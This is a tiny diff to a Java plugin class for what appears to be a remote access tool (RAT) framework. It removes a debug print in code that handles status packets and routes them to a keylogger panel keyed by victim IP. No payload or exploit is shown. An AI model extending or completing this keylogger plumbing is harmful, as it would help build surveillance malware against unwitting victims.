@@ -42,7 +42,6 @@ public class Plugin extends RATPlugin {
 		
 		if (event.getPacket().getHeader() == STATUS_HEADER) {
 			int len = dis.readInt();
-			System.out.println("Length: " + len);
 			
 			PanelKeylogger panel = (PanelKeylogger)entry.instances.get(event.getServer().getIP());
 			
